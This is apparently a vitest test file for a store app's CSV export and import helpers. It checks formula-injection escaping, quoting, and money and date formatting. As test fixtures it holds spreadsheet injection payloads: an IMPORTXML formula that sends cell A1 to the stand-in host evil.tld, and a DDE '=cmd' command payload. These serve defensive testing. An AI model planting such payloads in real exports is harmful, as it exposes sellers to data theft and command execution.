import { describe, expect, it } from "vitest";
import {
  bool,
  date,
  escapeField,
  field,
  money,
  parseBool,
  parseMoneyField,
  toCsv,
  UTF8_BOM,
} from "@/lib/csv";

/**
 * Every CSV Sailo hands a seller passes through here.
 *
 * The export is the one place where text a *buyer* typed — a name, an order
 * note, an address — leaves the app as a file the seller opens in Excel or
 * Sheets. A cell beginning `=` is a formula to a spreadsheet, and the
 * well-known consequences run from pulling the sheet's contents to a remote
 * URL through to a shell command behind a click. `escapeField` is the only
 * thing standing in the way, and it had no test.
 */

/**
 * The cell as a spreadsheet parses it, rather than as it sits on the line.
 *
 * `escapeField` prefixes the apostrophe *first* and then wraps the field in
 * quotes if it needs them, so a neutralised payload containing a quote reads
 * `"'=…"` on the line. Asserting on the raw string tests the order of two
 * internal steps; unwrapping first tests what Excel actually receives.
 */
function cellValue(escaped: string): string {
  if (!escaped.startsWith('"')) return escaped;
  return escaped.slice(1, -1).replace(/""/g, '"');
}

describe("escapeField — formula injection", () => {
  it.each(["=", "+", "-", "@"])(
    "neutralises a field beginning with %s",
    (lead) => {
      const out = escapeField(`${lead}HYPERLINK("http://evil.tld")`);
      expect(cellValue(out).startsWith("'")).toBe(true);
    },
  );

  it("neutralises the classic exfiltration payload", () => {
    // Pulls A1 to a remote server the moment the seller opens the file.
    const payload = '=IMPORTXML(CONCAT("http://evil.tld?v=",A1),"//a")';
    const out = escapeField(payload);
    expect(cellValue(out).startsWith("'")).toBe(true);
    // Still quoted on the line, because the payload contains commas and quotes.
    expect(out.startsWith('"')).toBe(true);
    expect(out).toContain('""');
  });

  it.each(["\t", "\r"])(
    "neutralises leading whitespace a spreadsheet would strip (%j)",
    (lead) => {
      /*
       * Excel trims a leading tab or carriage return before deciding whether
       * the cell is a formula, so "\t=cmd()" is still a formula. Guarding only
       * the four operator characters would miss it.
       */
      expect(cellValue(escapeField(`${lead}=1+1`)).startsWith("'")).toBe(true);
    },
  );

  it("leaves ordinary text alone", () => {
    // Over-escaping would put a stray quote in front of every product title.
    expect(escapeField("Blue T-Shirt")).toBe("Blue T-Shirt");
    expect(escapeField("Order #42")).toBe("Order #42");
  });

  it("does not treat a minus inside the text as a formula", () => {
    // Only the leading character decides.
    expect(escapeField("T-Shirt")).toBe("T-Shirt");
  });

  it("still escapes a negative number, because a spreadsheet cannot tell", () => {
    // "-5" is indistinguishable from the start of a formula to the parser
    // that matters, so it is quoted. The cost is cosmetic.
    expect(escapeField("-5").startsWith("'")).toBe(true);
  });
});

describe("escapeField — CSV structure", () => {
  it("quotes a field containing a comma, so it stays one column", () => {
    expect(escapeField("Smith, John")).toBe('"Smith, John"');
  });

  it("doubles embedded quotes rather than ending the field early", () => {
    expect(escapeField('He said "hi"')).toBe('"He said ""hi"""');
  });

  it.each(["\n", "\r"])("quotes a field containing a newline (%j)", (nl) => {
    // An order note is a textarea; a raw newline would start a new row.
    expect(escapeField(`line one${nl}line two`)).toContain('"');
  });

  it("renders null and undefined as empty, not as the words", () => {
    // "null" in a seller's spreadsheet is worse than a blank cell.
    expect(escapeField(null)).toBe("");
    expect(escapeField(undefined)).toBe("");
  });

  it("keeps a zero, which is a value rather than a blank", () => {
    expect(escapeField(0)).toBe("0");
    expect(escapeField(false)).toBe("false");
  });
});

describe("toCsv", () => {
  it("escapes the header row as well as the body", () => {
    // Headers can carry a shop's own column names on some exports.
    const out = toCsv(["=danger", "Name"], [["ok", "Smith, John"]]);
    expect(out.split("\n")[0]).toBe("'=danger,Name");
  });

  it("keeps a row on one line and separates columns with commas", () => {
    expect(toCsv(["A", "B"], [["1", "2"]])).toBe("A,B\n1,2\n");
  });

  it("ends with a newline, which POSIX tools expect", () => {
    expect(toCsv(["A"], [["1"]]).endsWith("\n")).toBe(true);
  });

  it("writes a header-only file when there are no rows", () => {
    // An empty export must still open as a valid file with its columns.
    expect(toCsv(["A", "B"], [])).toBe("A,B\n");
  });

  it("carries an injected payload through the whole pipeline neutralised", () => {
    const out = toCsv(["Name"], [['=cmd|"/c calc"!A1']]);
    expect(out).toContain("'=cmd");
  });
});

describe("the cell formatters", () => {
  it("writes money as a bare decimal with no currency symbol", () => {
    expect(money(2999, "USD")).toBe("29.99");
    expect(money(0, "USD")).toBe("0.00");
  });

  it("distinguishes a missing price from a free one", () => {
    // Blank means "inherit"; 0.00 means free. Collapsing them costs money.
    expect(money(null, "USD")).toBe("");
    expect(money(undefined, "USD")).toBe("");
    expect(money(0, "USD")).toBe("0.00");
  });

  it("writes the currency's own minor unit, so a re-import reads it back", () => {
    /*
     * Export and import are a round trip: `parseMoneyField` has been
     * currency-aware since seventy-one currencies were added, while this side
     * divided by a flat 100. Exporting a JPY catalogue and importing it again
     * divided every price by a hundred, in bulk, silently.
     */
    expect(money(1000, "JPY")).toBe("1000");
    expect(money(12_500, "KWD")).toBe("12.500");
    for (const [minor, code] of [[1000, "JPY"], [12_500, "KWD"], [2999, "USD"]] as const) {
      expect(parseMoneyField(money(minor, code), code)).toBe(minor);
    }
  });

  it("writes booleans as the words importers expect", () => {
    expect(bool(true)).toBe("TRUE");
    expect(bool(false)).toBe("FALSE");
  });

  it("writes dates as ISO, and nothing for no date", () => {
    expect(date(new Date("2026-08-06T12:00:00.000Z"))).toBe(
      "2026-08-06T12:00:00.000Z",
    );
    expect(date(null)).toBe("");
  });

  it("ships a byte-order mark so Excel reads accents correctly", () => {
    expect(UTF8_BOM.charCodeAt(0)).toBe(0xfeff);
  });
});

describe("field", () => {
  const row = { "Product Title": "Mug", SKU: " ABC ", Empty: "" };

  it("finds a column whatever its case or spacing", () => {
    expect(field(row, "product title")).toBe("Mug");
    expect(field(row, "PRODUCT TITLE")).toBe("Mug");
  });

  it("trims the value, because spreadsheets leave spaces everywhere", () => {
    expect(field(row, "SKU")).toBe("ABC");
  });

  it("takes the first name that matches, so aliases have a priority", () => {
    // Importers accept several spellings per column; order decides.
    expect(field(row, "Missing", "SKU")).toBe("ABC");
  });

  it("is empty when no alias matches", () => {
    expect(field(row, "Nope")).toBe("");
  });
});

describe("parseBool", () => {
  it.each(["true", "yes", "y", "1", "active", "TRUE", " Yes "])(
    "reads %j as true",
    (value) => {
      expect(parseBool(value)).toBe(true);
    },
  );

  it.each(["false", "no", "0", "anything"])("reads %j as false", (value) => {
    expect(parseBool(value)).toBe(false);
  });

  it("uses the caller's fallback for a blank, not false", () => {
    // A missing "In Stock" column must not silently unpublish a catalogue.
    expect(parseBool("", true)).toBe(true);
    expect(parseBool("   ", true)).toBe(true);
    expect(parseBool("", false)).toBe(false);
  });
});

describe("parseMoneyField", () => {
  it("reads both separator conventions, like the rest of the app", () => {
    expect(parseMoneyField("1,299.99")).toBe(129_999);
    expect(parseMoneyField("1.299,99")).toBe(129_999);
    expect(parseMoneyField("12,5")).toBe(1250);
  });

  it("returns null for blank rather than zero", () => {
    /*
     * The distinction the whole importer rests on: an empty price column means
     * "inherit from the product", and 0 means free.
     */
    expect(parseMoneyField("")).toBeNull();
    expect(parseMoneyField("   ")).toBeNull();
    expect(parseMoneyField("0")).toBe(0);
  });

  it("strips a currency symbol the seller left in", () => {
    expect(parseMoneyField("$29.99")).toBe(2999);
  });
});

describe("parseMoneyField distinguishes no answer from zero", () => {
  /*
   * The importer treats null as "inherit the product's price" and 0 as free.
   * A delegation to `parseMoneyToCents` — which answers 0 for text that is not
   * a number, because a form field has nowhere else to go — collapsed the two,
   * and a variant whose price cell held a stray "-" went live costing nothing.
   */
  it.each(["-", ".", ",", "1-2", "n/a", "TBC", "--"])(
    "returns null for unusable text, not 0 (%j)",
    (value) => {
      expect(parseMoneyField(value)).toBeNull();
    },
  );

  it("still returns 0 for a real zero, which means free", () => {
    expect(parseMoneyField("0")).toBe(0);
    expect(parseMoneyField("0.00")).toBe(0);
    expect(parseMoneyField("0,00")).toBe(0);
  });

  it("returns null for blank, which means inherit", () => {
    expect(parseMoneyField("")).toBeNull();
    expect(parseMoneyField("   ")).toBeNull();
  });

  it("never multiplies an imported price by a thousand", () => {
    expect(parseMoneyField("12.500")).toBe(1250);
    expect(parseMoneyField("0.750")).toBe(75);
  });
});
